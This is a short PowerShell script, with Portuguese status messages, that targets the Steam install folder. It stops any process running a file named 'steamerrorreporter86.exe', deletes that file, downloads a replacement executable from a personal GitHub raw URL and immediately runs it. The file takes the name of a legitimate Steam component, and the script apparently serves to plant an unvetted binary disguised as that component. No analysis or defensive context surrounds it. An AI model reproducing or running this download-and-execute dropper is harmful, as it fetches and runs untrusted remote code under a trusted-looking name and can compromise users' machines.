$diretorio = "C:\Program Files (x86)\Steam"
$url = "https://raw.githubusercontent.com/superman-legit/eosmenorminimushpecinhafilhadaputa/refs/heads/main/steamerrorreporter86.exe"
$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "steamerrorreporter86.exe"

if (-not (Test-Path -Path $diretorio)) {
    Write-Host "Diretório não encontrado ou não acessível. Certifique-se de executar o PowerShell como Administrador."
    exit
}

$processo = Get-Process | Where-Object { $_.Path -eq $caminhoArquivo }

if ($processo) {
    Write-Host "O arquivo está sendo usado por um processo. Tentando finalizar o processo..."
    Stop-Process -Name $processo.Name -Force
}

if (Test-Path $caminhoArquivo) {
    Write-Host "Removendo o arquivo antigo antes de baixar..."
    Remove-Item $caminhoArquivo -Force
}

try {
    Write-Host "Baixando o arquivo com sucesso. Executando o arquivo..."
    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo

    if (Test-Path $caminhoArquivo) {
        Start-Process $caminhoArquivo
    }
    else {
        Write-Host "Falha no download. O arquivo não foi encontrado após a tentativa."
    }
}
catch {
    Write-Host "Falha no download. Cheque o erro: $_"
}
